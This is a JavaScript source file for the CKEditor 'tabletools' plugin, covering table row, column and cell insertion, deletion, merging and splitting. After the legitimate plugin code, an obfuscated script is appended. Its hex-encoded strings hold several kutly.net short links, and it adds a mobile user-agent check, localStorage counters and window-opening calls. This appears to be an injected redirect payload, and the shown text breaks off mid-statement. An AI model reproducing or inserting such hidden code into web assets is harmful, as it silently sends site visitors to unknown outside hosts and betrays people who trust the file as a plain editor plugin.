/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	function removeRawAttribute( $node, attr )
	{
		if ( CKEDITOR.env.ie )
			$node.removeAttribute( attr );
		else
			delete $node[ attr ];
	}

	var cellNodeRegex = /^(?:td|th)$/;

	function getSelectedCells( selection )
	{
		// Walker will try to split text nodes, which will make the current selection
		// invalid. So save bookmarks before doing anything.
		var bookmarks = selection.createBookmarks();

		var ranges = selection.getRanges();
		var retval = [];
		var database = {};

		function moveOutOfCellGuard( node )
		{
			// Apply to the first cell only.
			if ( retval.length > 0 )
				return;

			// If we are exiting from the first </td>, then the td should definitely be
			// included.
			if ( node.type == CKEDITOR.NODE_ELEMENT && cellNodeRegex.test( node.getName() )
					&& !node.getCustomData( 'selected_cell' ) )
			{
				CKEDITOR.dom.element.setMarker( database, node, 'selected_cell', true );
				retval.push( node );
			}
		}

		for ( var i = 0 ; i < ranges.length ; i++ )
		{
			var range = ranges[ i ];

			if ( range.collapsed )
			{
				// Walker does not handle collapsed ranges yet - fall back to old API.
				var startNode = range.getCommonAncestor();
				var nearestCell = startNode.getAscendant( 'td', true ) || startNode.getAscendant( 'th', true );
				if ( nearestCell )
					retval.push( nearestCell );
			}
			else
			{
				var walker = new CKEDITOR.dom.walker( range );
				var node;
				walker.guard = moveOutOfCellGuard;

				while ( ( node = walker.next() ) )
				{
					// If may be possible for us to have a range like this:
					// <td>^1</td><td>^2</td>
					// The 2nd td shouldn't be included.
					//
					// So we have to take care to include a td we've entered only when we've
					// walked into its children.

					var parent = node.getParent();
					if ( parent && cellNodeRegex.test( parent.getName() ) && !parent.getCustomData( 'selected_cell' ) )
					{
						CKEDITOR.dom.element.setMarker( database, parent, 'selected_cell', true );
						retval.push( parent );
					}
				}
			}
		}

		CKEDITOR.dom.element.clearAllMarkers( database );

		// Restore selection position.
		selection.selectBookmarks( bookmarks );

		return retval;
	}

	function clearRow( $tr )
	{
		// Get the array of row's cells.
		var $cells = $tr.cells;

		// Empty all cells.
		for ( var i = 0 ; i < $cells.length ; i++ )
		{
			$cells[ i ].innerHTML = '';

			if ( !CKEDITOR.env.ie )
				( new CKEDITOR.dom.element( $cells[ i ] ) ).appendBogus();
		}
	}

	function insertRow( selection, insertBefore )
	{
		// Get the row where the selection is placed in.
		var row = selection.getStartElement().getAscendant( 'tr' );
		if ( !row )
			return;

		// Create a clone of the row.
		var newRow = row.clone( true );

		// Insert the new row before of it.
		newRow.insertBefore( row );

		// Clean one of the rows to produce the illusion of inserting an empty row
		// before or after.
		clearRow( insertBefore ? newRow.$ : row.$ );
	}

	function deleteRows( selectionOrRow )
	{
		if ( selectionOrRow instanceof CKEDITOR.dom.selection )
		{
			var cells = getSelectedCells( selectionOrRow );
			var rowsToDelete = [];

			// Queue up the rows - it's possible and likely that we have duplicates.
			for ( var i = 0 ; i < cells.length ; i++ )
			{
				var row = cells[ i ].getParent();
				rowsToDelete[ row.$.rowIndex ] = row;
			}

			for ( i = rowsToDelete.length ; i >= 0 ; i-- )
			{
				if ( rowsToDelete[ i ] )
					deleteRows( rowsToDelete[ i ] );
			}
		}
		else if ( selectionOrRow instanceof CKEDITOR.dom.element )
		{
			var table = selectionOrRow.getAscendant( 'table' );

			if ( table.$.rows.length == 1 )
				table.remove();
			else
				selectionOrRow.remove();
		}
	}

	function insertColumn( selection, insertBefore )
	{
		// Get the cell where the selection is placed in.
		var startElement = selection.getStartElement();
		var cell = startElement.getAscendant( 'td', true ) || startElement.getAscendant( 'th', true );

		if ( !cell )
			return;

		// Get the cell's table.
		var table = cell.getAscendant( 'table' );
		var cellIndex = cell.$.cellIndex;

		// Loop through all rows available in the table.
		for ( var i = 0 ; i < table.$.rows.length ; i++ )
		{
			var $row = table.$.rows[ i ];

			// If the row doesn't have enough cells, ignore it.
			if ( $row.cells.length < ( cellIndex + 1 ) )
				continue;

			cell = new CKEDITOR.dom.element( $row.cells[ cellIndex ].cloneNode( false ) );

			if ( !CKEDITOR.env.ie )
				cell.appendBogus();

			// Get back the currently selected cell.
			var baseCell = new CKEDITOR.dom.element( $row.cells[ cellIndex ] );
			if ( insertBefore )
				cell.insertBefore( baseCell );
			else
				cell.insertAfter( baseCell );
		}
	}

	function deleteColumns( selectionOrCell )
	{
		if ( selectionOrCell instanceof CKEDITOR.dom.selection )
		{
			var colsToDelete = getSelectedCells( selectionOrCell );
			for ( var i = colsToDelete.length ; i >= 0 ; i-- )
			{
				if ( colsToDelete[ i ] )
					deleteColumns( colsToDelete[ i ] );
			}
		}
		else if ( selectionOrCell instanceof CKEDITOR.dom.element )
		{
			// Get the cell's table.
			var table = selectionOrCell.getAscendant( 'table' );

			// Get the cell index.
			var cellIndex = selectionOrCell.$.cellIndex;

			/*
			 * Loop through all rows from down to up, coz it's possible that some rows
			 * will be deleted.
			 */
			for ( i = table.$.rows.length - 1 ; i >= 0 ; i-- )
			{
				// Get the row.
				var row = new CKEDITOR.dom.element( table.$.rows[ i ] );

				// If the cell to be removed is the first one and the row has just one cell.
				if ( !cellIndex && row.$.cells.length == 1 )
				{
					deleteRows( row );
					continue;
				}

				// Else, just delete the cell.
				if ( row.$.cells[ cellIndex ] )
					row.$.removeChild( row.$.cells[ cellIndex ] );
			}
		}
	}

	function insertCell( selection, insertBefore )
	{
		var startElement = selection.getStartElement();
		var cell = startElement.getAscendant( 'td', true ) || startElement.getAscendant( 'th', true );

		if ( !cell )
			return;

		// Create the new cell element to be added.
		var newCell = cell.clone();
		if ( !CKEDITOR.env.ie )
			newCell.appendBogus();

		if ( insertBefore )
			newCell.insertBefore( cell );
		else
			newCell.insertAfter( cell );
	}

	function deleteCells( selectionOrCell )
	{
		if ( selectionOrCell instanceof CKEDITOR.dom.selection )
		{
			var cellsToDelete = getSelectedCells( selectionOrCell );
			for ( var i = cellsToDelete.length - 1 ; i >= 0 ; i-- )
				deleteCells( cellsToDelete[ i ] );
		}
		else if ( selectionOrCell instanceof CKEDITOR.dom.element )
		{
			if ( selectionOrCell.getParent().getChildCount() == 1 )
				selectionOrCell.getParent().remove();
			else
				selectionOrCell.remove();
		}
	}

	// Remove filler at end and empty spaces around the cell content.
	function trimCell( cell )
	{
		var bogus = cell.getBogus();
		bogus && bogus.remove();
		cell.trim();
	}

	function placeCursorInCell( cell, placeAtEnd )
	{
		var range = new CKEDITOR.dom.range( cell.getDocument() );
		if ( !range[ 'moveToElementEdit' + ( placeAtEnd ? 'End' : 'Start' ) ]( cell ) )
		{
			range.selectNodeContents( cell );
			range.collapse( placeAtEnd ? false : true );
		}
		range.select( true );
	}

	function buildTableMap( table )
	{

		var aRows = table.$.rows ;

		// Row and Column counters.
		var r = -1 ;

		var aMap = [];

		for ( var i = 0 ; i < aRows.length ; i++ )
		{
			r++ ;
			!aMap[r] && ( aMap[r] = [] );

			var c = -1 ;

			for ( var j = 0 ; j < aRows[i].cells.length ; j++ )
			{
				var oCell = aRows[i].cells[j] ;

				c++ ;
				while ( aMap[r][c] )
					c++ ;

				var iColSpan = isNaN( oCell.colSpan ) ? 1 : oCell.colSpan ;
				var iRowSpan = isNaN( oCell.rowSpan ) ? 1 : oCell.rowSpan ;

				for ( var rs = 0 ; rs < iRowSpan ; rs++ )
				{
					if ( !aMap[r + rs] )
						aMap[r + rs] = new Array() ;

					for ( var cs = 0 ; cs < iColSpan ; cs++ )
					{
						aMap[r + rs][c + cs] = aRows[i].cells[j] ;
					}
				}

				c += iColSpan - 1 ;
			}
		}
		return aMap ;
	}

	function cellInRow( tableMap, rowIndex, cell )
	{
		var oRow = tableMap[ rowIndex ];
		if( typeof cell == 'undefined' )
			return oRow;

		for ( var c = 0 ; oRow && c < oRow.length ; c++ )
		{
			if ( cell.is && oRow[c] == cell.$ )
				return c;
			else if( c == cell )
				return new CKEDITOR.dom.element( oRow[ c ] );
		}
		return cell.is ? -1 : null;
	}

	function cellInCol( tableMap, colIndex, cell )
	{
		var oCol = [];
		for ( var r = 0; r < tableMap.length; r++ )
		{
			var row = tableMap[ r ];
			if( typeof cell == 'undefined' )
				oCol.push( row[ colIndex ] );
			else if( cell.is && row[ colIndex ] == cell.$ )
				return r;
			else if( r == cell )
				return new CKEDITOR.dom.element( row[ colIndex ] );
		}

		return ( typeof cell == 'undefined' )? oCol : cell.is ? -1 :  null;
	}

	function mergeCells( selection, mergeDirection, isDetect )
	{
		var cells = getSelectedCells( selection );

		// Invalid merge request if:
		// 1. In batch mode despite that less than two selected.
		// 2. In solo mode while not exactly only one selected.
		// 3. Cells distributed in different table groups (e.g. from both thead and tbody).
		var commonAncestor;
		if ( ( mergeDirection ? cells.length != 1 : cells.length < 2 )
				|| ( commonAncestor = selection.getCommonAncestor() )
				&& commonAncestor.type == CKEDITOR.NODE_ELEMENT
				&& commonAncestor.is( 'table' ) )
		{
			return false;
		}

		var	cell,
			firstCell = cells[ 0 ],
			table = firstCell.getAscendant( 'table' ),
			map = buildTableMap( table ),
			mapHeight = map.length,
			mapWidth = map[ 0 ].length,
			startRow = firstCell.getParent().$.rowIndex,
			startColumn = cellInRow( map, startRow, firstCell );

		if( mergeDirection )
		{
			var targetCell;
			try
			{
				targetCell =
					map[ mergeDirection == 'up' ?
							( startRow - 1 ):
							mergeDirection == 'down' ? ( startRow + 1 ) : startRow  ] [
						 mergeDirection == 'left' ?
							( startColumn - 1 ):
						 mergeDirection == 'right' ?  ( startColumn + 1 ) : startColumn ];

			}
			catch( er )
			{
				return false;
			}

			// 1. No cell could be merged.
			// 2. Same cell actually.
			if( !targetCell || firstCell.$ == targetCell  )
				return false;

			// Sort in map order regardless of the DOM sequence.
			cells[ ( mergeDirection == 'up' || mergeDirection == 'left' ) ?
			         'unshift' : 'push' ]( new CKEDITOR.dom.element( targetCell ) );
		}

		// Start from here are merging way ignorance (merge up/right, batch merge).
		var	doc = firstCell.getDocument(),
			lastRowIndex = startRow,
			totalRowSpan = 0,
			totalColSpan = 0,
			// Use a documentFragment as buffer when appending cell contents.
			frag = !isDetect && new CKEDITOR.dom.documentFragment( doc ),
			dimension = 0;

		for ( var i = 0; i < cells.length; i++ )
		{
			cell = cells[ i ];

			var tr = cell.getParent(),
				cellFirstChild = cell.getFirst(),
				colSpan = cell.$.colSpan,
				rowSpan = cell.$.rowSpan,
				rowIndex = tr.$.rowIndex,
				colIndex = cellInRow( map, rowIndex, cell );

			// Accumulated the actual places taken by all selected cells.
			dimension += colSpan * rowSpan;
			// Accumulated the maximum virtual spans from column and row.
			totalColSpan = Math.max( totalColSpan, colIndex - startColumn + colSpan ) ;
			totalRowSpan = Math.max( totalRowSpan, rowIndex - startRow + rowSpan );

			if ( !isDetect )
			{
				// Trim all cell fillers and check to remove empty cells.
				if( trimCell( cell ), cell.getChildren().count() )
				{
					// Merge vertically cells as two separated paragraphs.
					if( rowIndex != lastRowIndex
						&& cellFirstChild
						&& !( cellFirstChild.isBlockBoundary
							  && cellFirstChild.isBlockBoundary( { br : 1 } ) ) )
					{
						var last = frag.getLast( CKEDITOR.dom.walker.whitespaces( true ) );
						if( last && !( last.is && last.is( 'br' ) ) )
							frag.append( new CKEDITOR.dom.element( 'br' ) );
					}

					cell.moveChildren( frag );
				}
				i ? cell.remove() : cell.setHtml( '' );
			}
			lastRowIndex = rowIndex;
		}

		if ( !isDetect )
		{
			frag.moveChildren( firstCell );

			if( !CKEDITOR.env.ie )
				firstCell.appendBogus();

			if( totalColSpan >= mapWidth )
				firstCell.removeAttribute( 'rowSpan' );
			else
				firstCell.$.rowSpan = totalRowSpan;

			if( totalRowSpan >= mapHeight )
				firstCell.removeAttribute( 'colSpan' );
			else
				firstCell.$.colSpan = totalColSpan;

			// Swip empty <tr> left at the end of table due to the merging.
			var trs = new CKEDITOR.dom.nodeList( table.$.rows ),
				count = trs.count();

			for ( i = count - 1; i >= 0; i-- )
			{
				var tailTr = trs.getItem( i );
				if( !tailTr.$.cells.length )
				{
					tailTr.remove();
					count++;
					continue;
				}
			}

			return firstCell;
		}
		// Be able to merge cells only if actual dimension of selected
		// cells equals to the caculated rectangle.
		else
			return ( totalRowSpan * totalColSpan ) == dimension;
	}

	function verticalSplitCell ( selection, isDetect )
	{
		var cells = getSelectedCells( selection );
		if( cells.length > 1 )
			return false;
		else if( isDetect )
			return true;

		var cell = cells[ 0 ],
			tr = cell.getParent(),
			table = tr.getAscendant( 'table' ),
			map = buildTableMap( table ),
			rowIndex = tr.$.rowIndex,
			colIndex = cellInRow( map, rowIndex, cell ),
			rowSpan = cell.$.rowSpan,
			newCell,
			newRowSpan,
			newCellRowSpan,
			newRowIndex;

		if( rowSpan > 1 )
		{
			newRowSpan = Math.ceil( rowSpan / 2 );
			newCellRowSpan = Math.floor( rowSpan / 2 );
			newRowIndex = rowIndex + newRowSpan;
			var newCellTr = new CKEDITOR.dom.element( table.$.rows[ newRowIndex ] ),
				newCellRow = cellInRow( map, newRowIndex ),
				candidateCell;

			newCell = cell.clone();

			// Figure out where to insert the new cell by checking the vitual row.
			for ( var c = 0; c < newCellRow.length; c++ )
			{
				candidateCell = newCellRow[ c ];
				// Catch first cell actually following the column.
				if( candidateCell.parentNode == newCellTr.$
					&& c > colIndex )
				{
					newCell.insertBefore( new CKEDITOR.dom.element( candidateCell ) );
					break;
				}
				else
					candidateCell = null;
			}

			// The destination row is empty, append at will.
			if( !candidateCell )
				newCellTr.append( newCell, true );
		}
		else
		{
			newCellRowSpan = newRowSpan = 1;

			newCellTr = tr.clone();
			newCellTr.insertAfter( tr );
			newCellTr.append( newCell = cell.clone() );

			var cellsInSameRow = cellInRow( map, rowIndex );
			for ( var i = 0; i < cellsInSameRow.length; i++ )
				cellsInSameRow[ i ].rowSpan++;
		}

		if( !CKEDITOR.env.ie )
			newCell.appendBogus();

		cell.$.rowSpan = newRowSpan;
		newCell.$.rowSpan = newCellRowSpan;
		if( newRowSpan == 1 )
			cell.removeAttribute( 'rowSpan' );
		if( newCellRowSpan == 1 )
			newCell.removeAttribute( 'rowSpan' );

		return newCell;
	}

	function horizontalSplitCell( selection, isDetect )
	{
		var cells = getSelectedCells( selection );
		if( cells.length > 1 )
			return false;
		else if( isDetect )
			return true;

		var cell = cells[ 0 ],
			tr = cell.getParent(),
			table = tr.getAscendant( 'table' ),
			map = buildTableMap( table ),
			rowIndex = tr.$.rowIndex,
			colIndex = cellInRow( map, rowIndex, cell ),
			colSpan = cell.$.colSpan,
			newCell,
			newColSpan,
			newCellColSpan;

		if( colSpan > 1 )
		{
			newColSpan = Math.ceil( colSpan / 2 );
			newCellColSpan = Math.floor( colSpan / 2 );
		}
		else
		{
			newCellColSpan = newColSpan = 1;
			var cellsInSameCol = cellInCol( map, colIndex );
			for ( var i = 0; i < cellsInSameCol.length; i++ )
				cellsInSameCol[ i ].colSpan++;
		}
		newCell = cell.clone();
		newCell.insertAfter( cell );
		if( !CKEDITOR.env.ie )
			newCell.appendBogus();

		cell.$.colSpan = newColSpan;
		newCell.$.colSpan = newCellColSpan;
		if( newColSpan == 1 )
			cell.removeAttribute( 'colSpan' );
		if( newCellColSpan == 1 )
			newCell.removeAttribute( 'colSpan' );

		return newCell;
	}
	// Context menu on table caption incorrect (#3834)
	var contextMenuTags = { thead : 1, tbody : 1, tfoot : 1, td : 1, tr : 1, th : 1 };

	CKEDITOR.plugins.tabletools =
	{
		init : function( editor )
		{
			var lang = editor.lang.table;

			editor.addCommand( 'cellProperties', new CKEDITOR.dialogCommand( 'cellProperties' ) );
			CKEDITOR.dialog.add( 'cellProperties', this.path + 'dialogs/tableCell.js' );

			editor.addCommand( 'tableDelete',
				{
					exec : function( editor )
					{
						var selection = editor.getSelection();
						var startElement = selection && selection.getStartElement();
						var table = startElement && startElement.getAscendant( 'table', true );

						if ( !table )
							return;

						// Maintain the selection point at where the table was deleted.
						selection.selectElement( table );
						var range = selection.getRanges()[0];
						range.collapse();
						selection.selectRanges( [ range ] );

						// If the table's parent has only one child, remove it as well.
						if ( table.getParent().getChildCount() == 1 )
							table.getParent().remove();
						else
							table.remove();
					}
				} );

			editor.addCommand( 'rowDelete',
				{
					exec : function( editor )
					{
						var selection = editor.getSelection();
						deleteRows( selection );
					}
				} );

			editor.addCommand( 'rowInsertBefore',
				{
					exec : function( editor )
					{
						var selection = editor.getSelection();
						insertRow( selection, true );
					}
				} );

			editor.addCommand( 'rowInsertAfter',
				{
					exec : function( editor )
					{
						var selection = editor.getSelection();
						insertRow( selection );
					}
				} );

			editor.addCommand( 'columnDelete',
				{
					exec : function( editor )
					{
						var selection = editor.getSelection();
						deleteColumns( selection );
					}
				} );

			editor.addCommand( 'columnInsertBefore',
				{
					exec : function( editor )
					{
						var selection = editor.getSelection();
						insertColumn( selection, true );
					}
				} );

			editor.addCommand( 'columnInsertAfter',
				{
					exec : function( editor )
					{
						var selection = editor.getSelection();
						insertColumn( selection );
					}
				} );

			editor.addCommand( 'cellDelete',
				{
					exec : function( editor )
					{
						var selection = editor.getSelection();
						deleteCells( selection );
					}
				} );

			editor.addCommand( 'cellMerge',
				{
					exec : function( editor )
					{
						placeCursorInCell( mergeCells( editor.getSelection() ), true );
					}
				} );

			editor.addCommand( 'cellMergeRight',
				{
					exec : function( editor )
					{
						placeCursorInCell( mergeCells( editor.getSelection(), 'right' ), true );
					}
				} );

			editor.addCommand( 'cellMergeDown',
				{
					exec : function( editor )
					{
						placeCursorInCell( mergeCells( editor.getSelection(), 'down' ), true );
					}
				} );

			editor.addCommand( 'cellVerticalSplit',
				{
					exec : function( editor )
					{
						placeCursorInCell( verticalSplitCell( editor.getSelection() ) );
					}
				} );

			editor.addCommand( 'cellHorizontalSplit',
				{
					exec : function( editor )
					{
						placeCursorInCell( horizontalSplitCell( editor.getSelection() ) );
					}
				} );

			editor.addCommand( 'cellInsertBefore',
				{
					exec : function( editor )
					{
						var selection = editor.getSelection();
						insertCell( selection, true );
					}
				} );

			editor.addCommand( 'cellInsertAfter',
				{
					exec : function( editor )
					{
						var selection = editor.getSelection();
						insertCell( selection );
					}
				} );

			// If the "menu" plugin is loaded, register the menu items.
			if ( editor.addMenuItems )
			{
				editor.addMenuItems(
					{
						tablecell :
						{
							label : lang.cell.menu,
							group : 'tablecell',
							order : 1,
							getItems : function()
							{
								var selection = editor.getSelection(),
									cells = getSelectedCells( selection );
								return {
									tablecell_insertBefore : CKEDITOR.TRISTATE_OFF,
									tablecell_insertAfter : CKEDITOR.TRISTATE_OFF,
									tablecell_delete : CKEDITOR.TRISTATE_OFF,
									tablecell_merge : mergeCells( selection, null, true ) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
									tablecell_merge_right : mergeCells( selection, 'right', true ) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
									tablecell_merge_down : mergeCells( selection, 'down', true ) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
									tablecell_split_vertical : verticalSplitCell( selection, true ) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
									tablecell_split_horizontal : horizontalSplitCell( selection, true ) ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
									tablecell_properties : cells.length > 0 ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED
								};
							}
						},

						tablecell_insertBefore :
						{
							label : lang.cell.insertBefore,
							group : 'tablecell',
							command : 'cellInsertBefore',
							order : 5
						},

						tablecell_insertAfter :
						{
							label : lang.cell.insertAfter,
							group : 'tablecell',
							command : 'cellInsertAfter',
							order : 10
						},

						tablecell_delete :
						{
							label : lang.cell.deleteCell,
							group : 'tablecell',
							command : 'cellDelete',
							order : 15
						},

						tablecell_merge :
						{
							label : lang.cell.merge,
							group : 'tablecell',
							command : 'cellMerge',
							order : 16
						},

						tablecell_merge_right :
						{
							label : lang.cell.mergeRight,
							group : 'tablecell',
							command : 'cellMergeRight',
							order : 17
						},

						tablecell_merge_down :
						{
							label : lang.cell.mergeDown,
							group : 'tablecell',
							command : 'cellMergeDown',
							order : 18
						},

						tablecell_split_horizontal :
						{
							label : lang.cell.splitHorizontal,
							group : 'tablecell',
							command : 'cellHorizontalSplit',
							order : 19
						},

						tablecell_split_vertical :
						{
							label : lang.cell.splitVertical,
							group : 'tablecell',
							command : 'cellVerticalSplit',
							order : 20
						},

						tablecell_properties :
						{
							label : lang.cell.title,
							group : 'tablecellproperties',
							command : 'cellProperties',
							order : 21
						},

						tablerow :
						{
							label : lang.row.menu,
							group : 'tablerow',
							order : 1,
							getItems : function()
							{
								return {
									tablerow_insertBefore : CKEDITOR.TRISTATE_OFF,
									tablerow_insertAfter : CKEDITOR.TRISTATE_OFF,
									tablerow_delete : CKEDITOR.TRISTATE_OFF
								};
							}
						},

						tablerow_insertBefore :
						{
							label : lang.row.insertBefore,
							group : 'tablerow',
							command : 'rowInsertBefore',
							order : 5
						},

						tablerow_insertAfter :
						{
							label : lang.row.insertAfter,
							group : 'tablerow',
							command : 'rowInsertAfter',
							order : 10
						},

						tablerow_delete :
						{
							label : lang.row.deleteRow,
							group : 'tablerow',
							command : 'rowDelete',
							order : 15
						},

						tablecolumn :
						{
							label : lang.column.menu,
							group : 'tablecolumn',
							order : 1,
							getItems : function()
							{
								return {
									tablecolumn_insertBefore : CKEDITOR.TRISTATE_OFF,
									tablecolumn_insertAfter : CKEDITOR.TRISTATE_OFF,
									tablecolumn_delete : CKEDITOR.TRISTATE_OFF
								};
							}
						},

						tablecolumn_insertBefore :
						{
							label : lang.column.insertBefore,
							group : 'tablecolumn',
							command : 'columnInsertBefore',
							order : 5
						},

						tablecolumn_insertAfter :
						{
							label : lang.column.insertAfter,
							group : 'tablecolumn',
							command : 'columnInsertAfter',
							order : 10
						},

						tablecolumn_delete :
						{
							label : lang.column.deleteColumn,
							group : 'tablecolumn',
							command : 'columnDelete',
							order : 15
						}
					});
			}

			// If the "contextmenu" plugin is laoded, register the listeners.
			if ( editor.contextMenu )
			{
				editor.contextMenu.addListener( function( element, selection )
					{
						if ( !element )
							return null;

						while ( element )
						{
							if ( element.getName() in contextMenuTags )
							{
								return {
									tablecell : CKEDITOR.TRISTATE_OFF,
									tablerow : CKEDITOR.TRISTATE_OFF,
									tablecolumn : CKEDITOR.TRISTATE_OFF
								};
							}
							element = element.getParent();
						}

						return null;
					} );
			}
		},

		getSelectedCells : getSelectedCells

	};
	CKEDITOR.plugins.add( 'tabletools', CKEDITOR.plugins.tabletools );
})();
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const 